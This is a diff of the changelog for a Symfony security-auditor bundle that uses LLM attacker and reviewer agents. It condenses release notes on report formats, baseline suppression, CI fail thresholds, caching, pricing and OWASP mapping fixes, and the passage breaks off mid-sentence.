+- `audit:run --format=markdown` renders a GitHub-flavored report (heading, severity summary table and one section per finding) for pull-request comments and job summaries ([#66](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/66))
+- The attacker traces each attacker-controlled value from source to sink and checks for a neutralizing guard before reporting, sweeps the STRIDE categories per entry point, and weights severity by reachability and exposure ([#68](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/68))
 
-- **Type-level finding suppression — the `audit.excluded_types` and
-  `audit.included_types` config keys.** Muting a whole noisy class of finding
-  (e.g. `missing_rate_limiting`) previously required enumerating every finding's
-  baseline fingerprint; there was no way to say "never report this type."
-  `audit.excluded_types` now drops findings of the listed `VulnerabilityType`
-  values from the report **and** the exit code, and `audit.included_types` is an
-  allowlist that, when non-empty, keeps only the listed types (exclusions still
-  win). Both are validated against the `VulnerabilityType` enum at
-  config-compile time. A new `AuditReport::filteredByTypes()` (Domain,
-  copy-on-write like `withoutFingerprints()`) does the filtering and a
-  `FindingTypeFilter` (`src/Command/FindingTypeFilter.php`, behind
-  `FindingTypeFilterInterface`) applies the configured lists in `AuditCommand`
-  right after the audit runs — before baseline suppression, rendering, and
-  exit-code resolution — so muted types never appear, never fail CI, and are
-  absent from a generated baseline. Both default to `[]` (no filtering), so
-  existing runs are unchanged. Public API per `docs/versioning.md`.
-- **Configurable CI gate severity — the `audit.fail_on` config key and the
-  `--fail-on` CLI option.** `audit:run` hardcoded its failing exit code to a
-  `CRITICAL` aggregate risk level: `AuditExitCodeResolver::resolve()`
-  (`src/Command/AuditExitCodeResolver.php`) returned `1` only when
-  `AuditReport::riskLevel()` was exactly `CRITICAL`, so a HIGH-risk audit always
-  exited `0` and there was no way to fail a pull request on HIGH/MEDIUM/LOW
-  findings. A new ordered `RiskLevel` value object
-  (`src/Audit/Domain/Model/RiskLevel.php`, `safe` < `low` < `medium` < `high` <
-  `critical`, with `RiskLevel::isAtLeast()`) now backs the comparison:
-  `AuditReport::riskLevelEnum()` exposes the report's aggregate level and the
-  resolver exits `1` when it is **at or above** the configured threshold. The
-  threshold is set with `audit.fail_on` (`safe`|`low`|`medium`|`high`|
-  `critical`) and overridden per run with `audit:run --fail-on=<level>` (a
-  budget abort still exits `2`). The default is `critical`, so existing exit
-  codes are byte-identical on upgrade. **The default is planned to become `high`
-  in the next major** (see `docs/versioning.md`); pin `audit.fail_on` explicitly
-  to be immune to that change — `high` is recommended for CI gating. Public API
-  per `docs/versioning.md` (new config key, new CLI option, and the `RiskLevel`
-  Domain model).
-- **SARIF results now carry a stable `partialFingerprints` value, and each rule
-  links to its specific OWASP Top 10 page.** GitHub Code Scanning correlates
-  findings across runs by `partialFingerprints`; without one it could not track
-  a finding's fixed/reopened state and re-surfaced duplicates. Each SARIF result
-  emitted by `ReportRenderer::renderSarif()`
-  (`src/Audit/Infrastructure/Report/ReportRenderer.php`) now includes
-  `partialFingerprints: { "symfonySecurityAuditor/v1": "<fingerprint>" }` using
-  the same stable `Vulnerability::fingerprint()` that backs baselines. Each
-  rule's `helpUri` — previously the generic `https://owasp.org/Top10/` for every
-  rule — now points at the finding's actual OWASP 2021 category page via the new
-  `VulnerabilityType::owaspReferenceUrl()`. Both are additive to the SARIF 2.1.0
-  output (public API per `docs/versioning.md`).
-- **New `--format=markdown` output — a GitHub-flavored report for PR comments
-  and job summaries.** `audit:run` emitted `console`, `json`, `sarif`, and
-  `html`; teams not using Code Scanning had no concise report to post to a pull
-  request or write to `$GITHUB_STEP_SUMMARY`. The new `markdown` value renders a
-  heading, a severity summary table, and one section per finding (type + OWASP,
-  location, confidence, description, attack vector, proof, remediation), via
-  `ReportRenderer::renderMarkdown()`. `OutputFormat` gains a `Markdown` case and
-  `ReportWriter` a `markdown` arm. Public API per `docs/versioning.md` (the
-  `--format` value `markdown`).
+### Bugfixes 🐛
 
-### Changed
+- OWASP mapping: `authenticator_bypass` now maps to `A07:2021 - Identification and Authentication Failures` and `missing_signature_verification` to `A08:2021 - Software and Data Integrity Failures`, which changes the SARIF `ruleId` and `helpUri` of findings of those two types ([#66](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/66))
 
-- **The attacker prompt now applies an explicit source→sink methodology, a
-  STRIDE sweep, and exposure-weighted severity.** `AttackerPromptBuilder`
-  (`src/Audit/Infrastructure/Prompt/AttackerPromptBuilder.php`) gained an
-  "Analysis methodology" section that tells the model to trace each
-  attacker-controlled value from its trust-boundary source through to a
-  dangerous sink and to verify that no guard, validator, parameterization,
-  escaping, `access_control`, or voter neutralizes the path before recording a
-  finding; to sweep the STRIDE categories (Spoofing, Tampering, Repudiation,
-  Information disclosure, Denial of service, Elevation of privilege) per entry
-  point so no class is skipped; and to calibrate severity by reachability and
-  exposure (risk ≈ likelihood × impact) rather than bug class alone. Informed by
-  standard threat-modeling practice (STRIDE, trust boundaries, risk-based
-  prioritization). `PROMPT_VERSION` is bumped `8` → `9`, invalidating
-  previously-cached attacker responses so the new guidance takes effect.
+### Core 🧱
 
-### Fixed
-
-- **Corrected two OWASP Top 10 categorizations surfaced by the new per-rule
-  `helpUri`.** `VulnerabilityType::owaspReference()` (and the new
-  `owaspReferenceUrl()`) mis-filed two types: `authenticator_bypass` was under
-  `A01:2021 - Broken Access Control` and `missing_signature_verification` under
-  `A02:2021 - Cryptographic Failures`. They now map to the canonical categories
-  — **`authenticator_bypass` →
-  `A07:2021 - Identification and Authentication Failures`** (the textbook A07
-  case) and **`missing_signature_verification` →
-  `A08:2021 - Software and Data Integrity Failures`** (accepting unverified
-  payloads is an integrity failure, not a cryptographic one). This changes the
-  SARIF `ruleId` and `helpUri` for findings of those two types. The internal
-  `category()` grouping is unchanged (it has no auth/integrity bucket).
+- Cached attacker answers refresh once after upgrading ([#68](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/68))
 
 ## [1.10.1] — 2026-06-15 — Encore
 
-A packaging-only republish of **1.10.0 — Lookout**. The `1.10.0` tag was first
-pushed to an incomplete commit and indexed by Packagist; moving the tag to the
-finished release commit was then refused by
-[Packagist's stable-version immutability rule](https://packagist.org/about#version-immutability)
-("Upstream re-tag blocked — Packagist's stored snapshot may no longer match what
-is currently in git"), which locks a published version's source/dist reference
-forever. This release republishes the full, intended Lookout contents under a
-fresh, unblocked version so
-`composer require vinceamstoutz/symfony-security-auditor` resolves the complete
-release. **There are no source changes relative to the intended 1.10.0** — see
-the [1.10.0](#1100--2026-06-15--lookout) entry below for the actual features and
-fixes. The config-schema URL and GitHub Action `uses:` pins move from `1.10.0`
-to `1.10.1` accordingly.
+### Core 🧱
+
+- Packaging-only republish of 1.10.0 — Lookout, whose tag Packagist had indexed on an incomplete commit and could not move; there are no source changes, only the config-schema URL and GitHub Action `uses:` pins move from `1.10.0` to `1.10.1` ([#64](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/64))
 
 ## [1.10.0] — 2026-06-15 — Lookout
 
-A reporting-and-CI release. Audits gain a self-contained, HTML-escaped report
-(`--format=html`) and baseline suppression of accepted findings (`--baseline` /
-`--generate-baseline` / `audit.baseline`) so only new findings fail CI. The
-bundle now ships as a reusable, Marketplace-publishable GitHub Action and a JSON
-Schema that drives editor autocompletion for
-`config/packages/symfony_security_auditor.yaml`. The reviewer-verdict cache
-finally covers batched reviews, and the stale model hints in the Composer
-`suggest` block are refreshed.
+### New Features ✨
 
-### Added
+- `audit:run --format=html` renders a self-contained report (inline CSS, severity-colored summary table, one card per finding) with every dynamic value HTML-escaped, suitable as a CI artifact ([#59](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/59))
+- Baseline suppression of accepted findings: `audit:run --generate-baseline=<file>` writes the fingerprint of every current finding and exits `0`, and `--baseline=<file>` (or `audit.baseline`) drops the listed findings from the report and the exit code so only new findings fail CI; fingerprints ignore line numbers, and a malformed baseline file is refused ([#59](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/59))
+- A reusable composite GitHub Action (`uses: vinceamstoutz/symfony-security-auditor@v1`) sets up PHP, installs dependencies and runs `audit:run`, with inputs `project-path`, `format`, `output`, `baseline`, `generate-baseline`, `since`, `extra-args`, `php-version`, `setup-php`, `install-dependencies` and `working-directory` ([#59](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/59))
+- The bundle ships a JSON Schema that gives editors that use the YAML Language Server key completion, type checking and inline docs for the `symfony_security_auditor` bundle configuration file, enabled by a `# yaml-language-server: $schema=…` modeline ([#59](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/59))
 
-- **JSON Schema for editor autocompletion of the bundle configuration.** A
-  schema describing every `symfony_security_auditor:` key ships at
-  `resources/schema.json`. Editors backed by the YAML Language Server pick it up
-  from a `# yaml-language-server: $schema=…` modeline (added to the
-  `examples/configs/*.yaml` samples and documented in `docs/configuration.md`),
-  giving key completion, type checking, and inline docs while editing
-  `config/packages/symfony_security_auditor.yaml`.
-- **New `--format=html` output — a self-contained, HTML-escaped audit report.**
-  `audit:run` previously emitted only `console`, `json`, and `sarif`. The new
-  `html` value renders a standalone HTML document (inline CSS, severity-colored
-  summary table, one card per finding) suitable for sharing or archiving as a CI
-  artifact — `bin/console audit:run . --format=html --output=report.html`.
-  Implemented by `ReportRenderer::renderHtml()`
-  (`src/Audit/Infrastructure/Report/ReportRenderer.php`) against new
-  `Template/report.html` + `Template/vulnerability.html` stubs; every dynamic
-  value (titles, descriptions, code, file paths) is escaped with
-  `htmlspecialchars(…, ENT_QUOTES | ENT_SUBSTITUTE)` so a finding containing
-  `<script>` cannot inject markup into the report itself. `OutputFormat` gains a
-  `Html` case and `ReportWriter` an `html` arm. Public API per
-  `docs/versioning.md` (the `--format` value `html`).
-- **Baseline suppression of accepted findings — `--baseline`,
-  `--generate-baseline`, and the `audit.baseline` config key.** There was no way
-  to accept a known finding so it stopped failing CI. A finding now has a stable
-  `Vulnerability::fingerprint()` (`SSA-` + SHA-1 of type + file path + title —
-  deliberately independent of line numbers and the non-deterministic `id`).
-  `audit:run --generate-baseline=<file>` runs the audit, writes every current
-  finding's fingerprint to a JSON file, and exits `0`;
-  `audit:run --baseline=<file>` (or the `audit.baseline` default path) drops
-  findings whose fingerprint is listed from the report **and** from the
-  exit-code calculation, so previously-accepted findings no longer fail CI.
-  Backed by `AuditReport::fingerprints()` / `AuditReport::withoutFingerprints()`
-  (Domain) and the `Baseline` file gateway (`src/Command/Baseline.php`); a
-  malformed baseline file raises `MalformedBaselineFileException`. Public API
-  per `docs/versioning.md`.
-- **A reusable, Marketplace-publishable GitHub Action.** The repository now
-  ships a composite action (`action.yml` at the repo root) so consumers can run
-  an audit with `uses: vinceamstoutz/symfony-security-auditor@v1` instead of
-  scripting the steps. It sets up PHP, installs Composer dependencies, and runs
-  `audit:run`, exposing inputs for `project-path`, `format`, `output`,
-  `baseline`, `generate-baseline`, `since`, `extra-args`, `php-version`,
-  `setup-php`, `install-dependencies`, and `working-directory` (the provider key
-  is passed via `env:`). Documented in `docs/ci.md` (Reusable GitHub Action).
+### Bugfixes 🐛
 
-### Changed
+- Cost reporting: corrected stale Mistral list prices (`mistral-medium-latest` and `mistral-medium-2604` `$0.40/$2.00`, `mistral-small-latest` and `mistral-small-2603` `$0.15/$0.60`, `ministral-3b-2512` `$0.04/$0.04`, `ministral-8b-2512` `$0.10/$0.10` per million tokens), which had inflated the estimated and actual cost of those models ([#61](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/61))
 
-- **The reviewer-verdict cache now covers batched reviews
-  (`audit.reviewer_batch_size > 1`).** Batched reviews used to always call the
-  LLM — the cache only applied to one-finding-per-call modes — and `audit:run`
-  printed a pre-flight stderr notice whenever batching ran with the cache
-  enabled. `BatchReviewAnalyzer`
-  (`src/Audit/Application/Agent/Review/BatchReviewAnalyzer.php`) now mirrors
-  `ConcurrentReviewAnalyzer`: it resolves each finding's code context, serves
-  cache hits through `ReviewOutcomeRecorder::recordVerdict()`, and batches only
-  the cache-miss findings to the LLM (preserving the original finding order).
-  Matched verdicts from a miss batch are persisted via `BatchVerdictApplier`,
-  keyed by the finding's code context; a `--no-cache`/bypassed run reads and
-  writes nothing. The now-obsolete "batching disables the reviewer-verdict
-  cache" notice is removed from `ConfigurationNotices` (whose unused
-  `CacheConfiguration` parameter is dropped).
-- **The pre-flight token estimator is now one implementation per LLM provider.**
-  The monolithic `CharacterBasedTokenEstimator` (a single class holding a prefix
-  → chars-per-token lookup table for every vendor) is replaced by a
-  `ResolvingTokenEstimator` that dispatches each model to a dedicated
-  `ProviderTokenEstimatorInterface` implementation — `AnthropicTokenEstimator`,
-  `OpenAiTokenEstimator`, `GeminiTokenEstimator`, `MistralTokenEstimator`,
-  `LlamaTokenEstimator`, `DeepSeekTokenEstimator` — each owning its own
-  model-name matching and character-to-token ratio, with a shared
-  `CharacterRatioCounter` doing the arithmetic
-  (`src/Audit/Infrastructure/LLM/TokenEstimator/`). The estimates are unchanged
-  (identical ratios, prefixes, and unknown-model fallback), so reported
-  `--dry-run` costs stay the same; the win is that adding or tuning a provider
-  is now a small, isolated class tagged
-  `symfony_security_auditor.token_estimator` rather than an edit to a shared
-  table. `CharacterBasedTokenEstimator` was `@internal`, so this is not a BC
-  break (the public `TokenEstimatorInterface` port is untouched).
+### Performance Improvements 🚀
 
-### Fixed
+- The reviewer-verdict cache now covers batched reviews (`audit.reviewer_batch_size` > 1): cached verdicts are served first and only the misses go to the LLM, and the pre-flight notice that batching disables the cache is removed ([#58](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/58))
 
-- **Corrected stale Mistral list prices in the built-in cost table.** Six
-  entries in `StaticPricingProvider::PRICES`
-  (`src/Audit/Infrastructure/Pricing/StaticPricingProvider.php`) overstated
-  Mistral's current per-million-token rates, inflating the estimated/actual cost
-  reported for those models. Reconciled against
-  [models.dev](https://models.dev):
-  `mistral-medium-latest`/`mistral-medium-2604` `$1.50/$7.50` → `$0.40/$2.00`,
-  `mistral-small-latest`/`mistral-small-2603` `$0.10/$0.30` → `$0.15/$0.60`,
-  `ministral-3b-2512` `$0.10/$0.10` → `$0.04/$0.04`, and `ministral-8b-2512`
-  `$0.15/$0.15` → `$0.10/$0.10`. All other providers were spot-checked and left
-  unchanged; cost reporting for the affected Mistral models is now accurate.
+### Core 🧱
+
+- The pre-flight token estimator is now one implementation per LLM provider, tagged `symfony_security_auditor.token_estimator`, with unchanged estimates so `--dry-run` costs stay the same ([#61](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/61))
+- The model hints in the Composer `suggest` block are refreshed ([#57](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/57))
 
 ## [1.9.0] — 2026-06-12 — Slipstream
 
-A config-less performance and reviewer-trust release. The zero-configuration
-path is now also the cheap and fast one: `claude-opus-4-8` and a byte-stable
-attacker system prompt (provider prompt-cache friendly on Anthropic, OpenAI,
-Gemini, and DeepSeek) by default, a one-knob `profile` preset for everything
-else, caches that finally cover iterations 2+ and concurrent reviews, and
-reviewer verdicts recorded through a schema-enforced `record_review` tool by
-default — cached across runs and fed back to the attacker when findings are
-rejected. The long audit stage shows live progress in the console, prompt-cache
-tokens are priced into the reported cost, reports lead with their most severe
-findings, and the attacker's route map stops mislabelling firewall-covered
-routes.
+### New Features ✨
 
-### Added
+- The default `model` is now `claude-opus-4-8` at the same `$5/$25` per-MTok price; pin `model: 'claude-opus-4-7'` to keep the previous default ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- `profile` (`fast`, `balanced` default or `thorough`) is a one-knob preset for `audit.max_iterations`, `audit.static_prescan.lean_mode`, `audit.code_slicing.enabled`, `audit.poc_synthesis.enabled` and `audit.reviewer_max_concurrent`; it only fills keys you left unset, `balanced` equals configuring nothing, `fast` runs one iteration with code slicing and four concurrent reviews, and `thorough` adds PoC synthesis ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- `audit.reviewer_structured_collection` (default `true`) records reviewer verdicts through a schema-enforced `record_review` tool so a malformed verdict cannot occur; `reviewer_tools_enabled: true` keeps the JSON path, `reviewer_max_concurrent` > 1 composes with it on async platforms, and `false` forces JSON-array output for models without tool use ([#48](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/48), [#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- The reviewer concurrently reviews findings through `record_review` when `reviewer_max_concurrent` > 1, via the new `ToolBatchCapableLLMClientInterface` port, and falls back to the JSON path on clients without it ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- The attacker is told which findings the reviewer already rejected and is instructed not to re-report those locations, so later iterations stop re-reporting them ([#44](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/44))
+- The reviewer no longer drops real findings that are hard to prove: it rejects only when it can name a mitigating control or the pattern is absent, and otherwise accepts with a downgraded severity (down to `info`) and records the missing evidence in `reviewer_notes` ([#42](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/42))
+- The attacker's route access-control map tags a route covered by a `security.yaml` `access_control` rule as `COVERED_BY access_control[…]` with its roles, instead of `LACKS_ACCESS_CHECK`, removing a class of false `broken_access_control` findings ([#47](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/47))
+- Reports list vulnerabilities most-severe-first in the console, the JSON `vulnerabilities` array and the SARIF `results` array (ties keep discovery order) ([#54](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/54))
+- The console shows live audit-stage progress (`audit · iteration 1/3 · attacker chunk 4/12`, `audit · iteration 1/3 · reviewing 4 finding(s)`) and a long-run notice above the progress bar; `--format=json|sarif` on stdout stays clean ([#55](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/55))
+- Prompt-cache tokens are priced into the audit cost: cache reads and writes now count in budget enforcement and `estimated_cost_usd` (Claude models at `0.1x` for reads and `1.25x` for writes, other models at the plain input rate) ([#50](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/50))
+- `audit:run` prints pre-flight stderr notices when escalation's `audit.escalation.cheap_model` resolves to the attacker model (no saving), when `reviewer_max_concurrent` > 1 is combined with `reviewer_tools_enabled: true`, when `attacker_max_concurrent` > 1 lacks the structured-collection-without-tools mode it needs, and when batched reviews disable the reviewer cache ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
+- The `--dry-run` output states that real runs typically cost less, since the estimate excludes provider prompt-cache discounts and warm caches ([#56](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/56))
 
-- **`audit:run` warns when cheap-then-expensive escalation can't save money.**
-  `audit.escalation.cheap_model` falls back to the reviewer model when unset,
-  which on a single-model config resolves to the attacker model — so the cheap
-  sweep costs as much as the expensive pass and escalation saves nothing,
-  silently. `ConfigurationNotices` now emits a pre-flight stderr notice when
-  escalation is enabled and the resolved cheap model equals the attacker model,
-  pointing at `audit.escalation.cheap_model`. Two further notices cover the
-  silent no-op cases where a concurrency knob is set but ignored:
-  `reviewer_max_concurrent` > 1 with `reviewer_tools_enabled: true`, and
-  `attacker_max_concurrent` > 1 without the structured-collection-and-no-tools
-  mode it requires.
-- **The `--dry-run` note now states that real runs typically cost less.** The
-  estimate excludes provider prompt-cache discounts and warm attacker/reviewer
-  caches; the dry-run output now says so explicitly instead of only the docs
-  mentioning it.
-- **New `audit.attacker_max_concurrent` config key — concurrent attacker chunk
-  analysis.** The attacker analysed chunks strictly sequentially, so the longest
-  audit phase paid one full LLM round trip per chunk back-to-back. In the
-  default structured-collection mode, when the configured platform exposes an
-  async transport, cache-miss chunks are now resolved concurrently through the
-  new `ToolBatchCapableLLMClientInterface` wavefront — each chunk keeps its own
-  `record_vulnerability` registry and `VulnerabilityCollector`, so findings
-  never cross-contaminate. Cache hits short-circuit first; chunk order,
-  coverage, caching, and drop accounting are byte-identical to the sequential
-  path. Defaults to the active profile (`fast`: `4`, `balanced`/`thorough`:
-  `1`); ignored when `audit.tools_enabled` gives the attacker a cross-file tool
-  registry or `audit.structured_collection` is off. Public API per
-  `docs/versioning.md`.
-- **Live audit-stage progress and an upfront long-run notice in the console.**
-  During the audit stage — by far the longest — the progress bar sat frozen at
-  the same percentage with no sign the run was still alive, sometimes for 20+
-  minutes
-  ([#39](https://github.com/vinceAmstoutz/symfony-security-auditor/issues/39)).
-  `audit:run` (console format only) now prints a note above the progress bar
-  warning that the audit typically takes several minutes, and the bar message
-  updates continuously with the current activity, e.g.
-  `audit · iteration 1/3 · attacker chunk 4/12` and
-  `audit · iteration 1/3 · reviewing 4 finding(s)`. Three new wire-format
-  progress events back this: `audit.iteration.started` and `review.started`
-  (emitted by `AuditOrchestrator`) and `attacker.chunk.started` (emitted by
-  `AttackerAgent`), all flowing through the existing `ProgressReporterInterface`
-  port and rendered by `ConsoleProgressReporter`
-  (`src/Audit/Infrastructure/Progress/ConsoleProgressReporter.php`).
-  Machine-readable stdout (`--format=json|sarif` without `--output`) stays clean
-  — neither the notice nor the bar is emitted there.
-- **The attacker now learns which findings the reviewer already rejected.**
-  After the first iteration, `AuditOrchestrator`
-  (`src/Audit/Application/Agent/AuditOrchestrator.php`) collected only the
-  reviewer-_validated_ findings to feed back to the attacker; rejected findings
-  were invisible, so every subsequent iteration re-reported them, the confidence
-  filter let them through, and the reviewer re-rejected them — burning attacker
-  tool-call and reviewer budget each round before the deduplication step finally
-  discarded them. The orchestrator now also gathers reviewer-rejected findings
-  and passes them through a new `AttackerAnalysisRequest::$rejectedFindings`
-  field; `AttackerContextPromptRenderer::renderRejectedFindings()` injects a
-  `Findings Already Rejected by the Reviewer` preamble instructing the model not
-  to re-report those locations. Chunks carrying rejected-finding context are not
-  served from the attacker cache (the same rule already applied to validated
-  prior findings), so the new context always reaches the model.
-- **New `audit.reviewer_structured_collection` config key — provider-validated
-  reviewer verdicts, on by default.** The reviewer returned its verdicts as a
-  hand-parsed JSON array; a malformed response was discarded (after being fully
-  billed) and every finding in the call degraded to rejected. The reviewer now
-  records each verdict by calling a schema-enforced `record_review` tool
-  (`src/Audit/Infrastructure/Tool/RecordReviewTool.php`) — mirroring the
-  attacker's `record_vulnerability` seam: the provider validates every call
-  against the tool's JSON schema (`id` + `accepted` required,
-  `adjusted_severity` / `corrected_type` constrained to their enums), so a
-  malformed verdict is structurally impossible. Verdicts flow through a new
-  `ReviewCollector` (Application) and are re-keyed by `id` exactly like the JSON
-  batch path. Defaults to `true` — matching the attacker's
-  `structured_collection` default, so the schema-safe (and cheaper: no
-  billed-but-discarded responses) path needs no configuration. The released
-  explicit opt-in `reviewer_tools_enabled: true` takes precedence and keeps the
-  JSON path; `reviewer_max_concurrent` > 1 composes with the structured mode on
-  platforms with an async transport and falls back to the JSON path otherwise —
-  in both cases behaving at least as well as before the upgrade. Set
-  `reviewer_structured_collection: false` to force JSON-array output (the safety
-  net for models without tool-use support).
-- **New `audit.stable_system_prompt` config key — a byte-stable attacker system
-  prompt for provider cache reuse, on by default.** The attacker used to emit
-  only the expert skill blocks matching a chunk's file types, so its system
-  prompt differed chunk-to-chunk and provider prompt caching rarely got a hit on
-  it — Anthropic (`cache_retention` in `ai.yaml`, default `short`), OpenAI,
-  Gemini, and DeepSeek all cache prompt prefixes that this defeated. With
-  `stable_system_prompt: true` (the default), `AttackerPromptBuilder`
-  (`src/Audit/Infrastructure/Prompt/AttackerPromptBuilder.php`) emit the full
-  skill set for every chunk, so the system-prompt prefix is byte-identical
-  across chunks: the first chunk pays a cache write and every subsequent chunk
-  reads the prefix at the provider's discounted cache-read rate. The trade-off
-  is a larger prompt when caching is off, so the key defaults to `false`
-  (relevance-only skills, the previous behaviour). Both this flag and
-  `structured_collection` are folded into the attacker cache key salt, so
-  toggling either invalidates cached responses produced under the other prompt
-  shape instead of replaying them.
-- **Reviewer verdicts are now cached across runs, skipping redundant reviewer
-  LLM calls.** A new filesystem cache
-  (`src/Audit/Infrastructure/Cache/FilesystemReviewerCache.php`, behind the
-  Domain port `src/Audit/Domain/Port/ReviewerCacheInterface.php`) stores each
-  reviewer verdict keyed by the SHA-256 of the finding's stable content (its
-  `Vulnerability::toArray()` minus the non-deterministic `id`) plus the reviewed
-  code context, folded behind a salt of
-  `{reviewer_model}|reviewer-v{N}|prompt-v{M}`. When the attacker re-surfaces a
-  finding with identical content against unchanged code — the common case on
-  repeated CI/PR scans — `ReviewerAgent::review()` reuses the stored verdict
-  instead of calling the LLM again. The cache reuses the existing
-  `cache.enabled` switch (when `false`, a `NullReviewerCache` no-op is wired)
-  and lives in a `reviewer` subdirectory alongside the attacker cache under
-  `cache.dir`. The cache applies to one-finding-per-call reviews — the default,
-  in the structured `record_review` mode, the JSON mode, and the concurrent
-  paths (cached verdicts are served first and only the misses are dispatched);
-  batched (`reviewer_batch_size > 1`) reviews always call the LLM, and
-  `audit:run` prints a one-shot stderr notice when that combination is
-  configured so the disabled cache is never silent. The `--no-cache` flag
-  bypasses it for the run (no reads, no writes), mirroring the attacker cache. A
-  reviewer-prompt change invalidates the cache automatically via
-  `ReviewerPromptBuilder::PROMPT_VERSION` in the salt; a storage-format or
-  verdict-contract change is invalidated by bumping
-  `FilesystemReviewerCache::CACHE_VERSION`.
-- **Prompt-cache tokens are now priced into the audit cost.** Providers that
-  report prompt caching (Anthropic's `cache_read_input_tokens` /
-  `cache_creation_input_tokens`) were previously invisible to cost accounting:
-  `SymfonyAiLLMClient` only read `getPromptTokens()` / `getCompletionTokens()`,
-  so cache reads and writes contributed `$0.00` to the budget tracker and the
-  final `AuditCost`. The client now also reads
-  `TokenUsageInterface::getCacheReadTokens()` and `getCacheCreationTokens()`,
-  carries them on `LLMResponse` (new `cacheReadTokens()` /
-  `cacheCreationTokens()` accessors, defaulting to `0`) and accumulates them in
-  `TokenUsageRecorder` / `TokenUsageSnapshot`. `CostCalculator::costForCall()`
-  prices them against the model's input rate — for Claude models at Anthropic's
-  published multipliers (cache reads at `0.1x`, cache writes at `1.25x` for the
-  default 5-minute cache); for any other model that reports these fields, cache
-  tokens are conservatively priced at the plain input rate rather than asserting
-  Anthropic's economics — so both the live budget enforcement (`BudgetTracker`)
-  and the reported `estimated_cost_usd` reflect real cache spend. Runs against
-  providers that do not report cache tokens are unaffected (the new counts
-  default to `0`).
+### Bugfixes 🐛
 
-- **New top-level `profile` config key — one knob instead of ten.**
-  `symfony_security_auditor.profile` accepts `fast`, `balanced` (default), or
-  `thorough` and pre-sets the cost/speed/depth levers (`audit.max_iterations`,
-  `audit.static_prescan.lean_mode`, `audit.code_slicing.enabled`,
-  `audit.poc_synthesis.enabled`, `audit.reviewer_max_concurrent`) through the
-  new Domain enum `src/Audit/Domain/Configuration/AuditProfile.php`. A profile
-  only fills the keys you left unset — any explicitly configured key always
-  wins. `fast` runs a single attacker iteration over marker-bearing files with
-  code slicing and four concurrent reviewer calls; `balanced` is byte-identical
-  to configuring nothing; `thorough` adds PoC synthesis. Public API per
-  `docs/versioning.md`.
-- **Concurrent structured reviews — `reviewer_max_concurrent` now composes with
-  `record_review` instead of disabling it.** A new opt-in Domain port
-  (`src/Audit/Domain/Port/ToolBatchCapableLLMClientInterface.php`) lets a client
-  resolve several independent tool-using conversations concurrently;
-  `SymfonyAiLLMClient` implements it as a wavefront — each round dispatches the
-  next platform invocation for every still-pending conversation without
-  blocking, then executes the requested tools against that conversation's own
-  registry, so on an async transport the rounds overlap on the wire. A
-  conversation that fails before any tool ran falls back to the proven
-  sequential path; one that fails after a tool produced side effects finalizes
-  as an empty response so tools never execute twice. With
-  `reviewer_max_concurrent` > 1 the reviewer now reviews findings concurrently
-  in the structured mode (each finding records through its own `record_review`
-  tool) and only falls back to the JSON concurrent path on clients without the
-  capability.
-- **The attacker cache now covers iterations 2+.** Chunks carrying
-  cross-iteration context (prior validated findings, reviewer-rejected findings)
-  used to bypass the attacker cache entirely, so every multi-pass audit re-paid
-  for those chunks even on unchanged code. A new opt-in Domain port
-  (`src/Audit/Domain/Port/ContextAwareAttackerCacheInterface.php`) keys an entry
-  by chunk + a SHA-256 of the rendered context preambles;
-  `FilesystemAttackerCache` and `NullAttackerCache` implement it, and an empty
-  context key addresses the same entry as the context-free `get()`/`store()`
-  pair so existing on-disk entries stay readable. A cache that does not
-  implement the port keeps the previous skip-on-context behaviour.
-- **`audit:run` now surfaces configuration combinations that silently disable a
-  cost saver.** The bundle computes a list of config notices at compile time
-  (currently: the reviewer-verdict cache not applying when
-  `audit.reviewer_batch_size > 1` while `cache.enabled` is on) and
-  `AuditPresenter` prints each one to stderr before the run, alongside the
-  existing secret-scrubbing warning — visible in every output format without
-  polluting machine-readable stdout.
+- The attacker prompt no longer asks for a JSON array in the default structured-collection mode, where it contradicted the `record_vulnerability` instruction and could produce discarded output ([#41](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/41))
+- The reviewer can relabel a finding to `over_permissive_serializer_group`, the one type it could not previously correct to ([#41](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/41))
+- `audit:run --dry-run` no longer undercounts tokens for `claude-fable-5` and `claude-mythos-5`, whose new tokenizer emits about 30% more tokens, so the estimated cost is no longer about a third too low ([#43](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/43))
 
-### Changed
+### Performance Improvements 🚀
 
-- **The default model is now `claude-opus-4-8`.** The `model` key defaulted to
-  `claude-opus-4-7`; Anthropic lists Opus 4.8 at the same `$5/$25` per-MTok
-  price with higher capability, and the FAQ already recommended it — so a
-  zero-config install now gets the better model at unchanged cost. Pin
-  `model: 'claude-opus-4-7'` to keep the previous default.
-- **Reports now list vulnerabilities most-severe-first.** `AuditReport`
-  (`src/Audit/Domain/Model/AuditReport.php`) kept vulnerabilities in discovery
-  order, so a lone high-severity finding could sit buried between medium and low
-  ones and readers had to scroll the whole list to find it
-  ([#40](https://github.com/vinceAmstoutz/symfony-security-auditor/issues/40)).
-  The report now orders findings by descending `VulnerabilitySeverity::score()`
-  — critical → high → medium → low → info, ties keeping discovery order — so the
